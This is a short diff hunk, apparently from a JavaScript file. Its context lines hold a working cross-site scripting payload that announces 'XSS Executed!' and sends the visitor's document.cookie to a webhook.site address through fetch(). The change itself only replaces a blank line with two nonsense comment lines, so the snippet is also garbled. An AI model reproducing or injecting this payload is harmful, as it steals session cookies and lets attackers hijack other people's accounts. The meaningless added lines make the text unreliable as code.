@@ -88,4 +88,5 @@
 console.log("XSS Executed! Sending to webhook...");
 document.body.style.backgroundColor = "orange";
 fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
-
+// <><<><<>
+// ghjk,kjn
